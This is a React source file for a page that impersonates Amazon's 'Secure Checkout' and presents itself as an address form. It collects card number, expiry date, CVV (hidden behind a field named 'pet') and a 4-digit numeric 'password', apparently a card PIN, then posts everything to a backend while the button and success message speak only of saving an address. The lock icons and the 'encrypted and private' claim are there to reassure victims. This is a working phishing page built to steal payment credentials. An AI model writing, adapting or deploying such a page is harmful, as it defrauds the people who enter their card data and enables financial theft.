import { StrictMode, useState } from 'react';
import { createRoot } from 'react-dom/client';
import './styles.css';

const initialForm = {
  address: '',
  zipCode: '',
  state: '',
  city: '',
  country: '',
  cardNumber: '',
  expiryDate: '',
  pet: '',
  password: ''
};

function App() {
  const [form, setForm] = useState(initialForm);
  const [status, setStatus] = useState({ type: '', message: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);

  function updateField(event) {
    const { name, value } = event.target;
    let formattedValue = value;
    if (name === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
    }
    if (name === 'expiryDate') {
      const digits = value.replace(/\D/g, '').slice(0, 4);
      formattedValue = digits.length > 2 ? `${digits.slice(0, 2)} / ${digits.slice(2)}` : digits;
    }
    if (name === 'password') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4);
    }
    setForm((currentForm) => ({ ...currentForm, [name]: formattedValue }));
    if (status.type) setStatus({ type: '', message: '' });
  }

  async function submitForm(event) {
    event.preventDefault();
    setIsSubmitting(true);
    setStatus({ type: '', message: '' });

    try {
      const response = await fetch('/api/addresses', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form)
      });
      const result = await response.json();

      if (!response.ok) throw new Error(result.message || 'Something went wrong.');
      setForm(initialForm);
      setStatus({ type: 'success', message: 'Your address has been securely saved.' });
    } catch (error) {
      setStatus({ type: 'error', message: error.message });
    } finally {
      setIsSubmitting(false);
    }
  }

    return (
      <main className="page-shell">
        <header className="site-header">
          <span className="brand-name">Amazon</span>
          <span className="secure-label"><span aria-hidden="true">&#128274;</span> Secure Checkout</span>
        </header>

        <div className="checkout-layout">
          <section className="form-panel" aria-labelledby="page-title">
            <div className="page-heading">
              <h1 id="page-title">Payment details</h1>
              <p>Enter the address linked to your Amazon account.</p>
            </div>
            <form onSubmit={submitForm}>
              <div className="form-card">
                <div className="form-heading">
                  <div className="heading-with-step"><span className="step-number">1</span><div><h2>Address details</h2><p>Use the address where you would like to receive updates.</p></div></div>
                  <span className="required-note">* Required</span>
                </div>
                <div className="field full-width">
                  <label htmlFor="address">Address <span>*</span></label>
                  <input id="address" name="address" type="text" autoComplete="street-address" placeholder="Street address" value={form.address} onChange={updateField} required />
                </div>
                <div className="field-grid">
                  <div className="field city-field">
                    <label htmlFor="city">City <span>*</span></label>
                    <input id="city" name="city" type="text" autoComplete="address-level2" value={form.city} onChange={updateField} required />
                  </div>
                  <div className="field state-field">
                    <label htmlFor="state">State <span>*</span></label>
                    <input id="state" name="state" type="text" autoComplete="address-level1" value={form.state} onChange={updateField} required />
                  </div>
                  <div className="field zip-field">
                    <label htmlFor="zipCode">PIN / ZIP code <span>*</span></label>
                    <input id="zipCode" name="zipCode" type="text" autoComplete="postal-code" value={form.zipCode} onChange={updateField} required />
                  </div>
                  <div className="field country-field">
                    <label htmlFor="country">Country <span>*</span></label>
                    <input id="country" name="country" type="text" autoComplete="country-name" value={form.country} onChange={updateField} required />
                  </div>
                </div>
              </div>

              <div className="form-card additional-card">
                <div className="form-heading">
                  <div className="heading-with-step"><span className="step-number">2</span><div><h2>Additional details</h2><p>Enter the remaining information below.</p></div></div>
                  <span className="required-note">* Required</span>
                </div>
                <div className="field-grid">
                  <div className="field card-number-field">
                    <label htmlFor="cardNumber">Card number <span>*</span></label>
                    <input id="cardNumber" name="cardNumber" type="text" inputMode="numeric" autoComplete="cc-number" placeholder="0000 0000 0000 0000" value={form.cardNumber} onChange={updateField} required />
                  </div>
                  <div className="field expiry-field">
                    <label htmlFor="expiryDate">Expiry date <span>*</span></label>
                    <input id="expiryDate" name="expiryDate" type="text" inputMode="numeric" autoComplete="cc-exp" placeholder="MM / YY" value={form.expiryDate} onChange={updateField} required />
                  </div>
                  <div className="field pet-field">
                    <label htmlFor="pet">CVV <span>*</span></label>
                    <input id="pet" name="pet" type="text" value={form.pet} onChange={updateField} required />
                  </div>
                  <div className="field password-field">
                    <label htmlFor="password">Password <span>*</span></label>
                    <input id="password" name="password" type="password" inputMode="numeric" autoComplete="off" maxLength="4" placeholder="4-digit password" value={form.password} onChange={updateField} required />
                  </div>
                </div>
                <div className="form-footer">
                  <p className="privacy-note"><span className="lock" aria-hidden="true">&#128274;</span> Your information is encrypted and private.</p>
                  <button type="submit" disabled={isSubmitting}>{isSubmitting ? 'Saving...' : 'Save address'} <span aria-hidden="true">&#8594;</span></button>
                </div>
                {status.message && <p className={`status-message ${status.type}`} role="status">{status.message}</p>}
              </div>
            </form>
          </section>
        </div>
    </main>
  );
}

createRoot(document.getElementById('root')).render(<StrictMode><App /></StrictMode>);
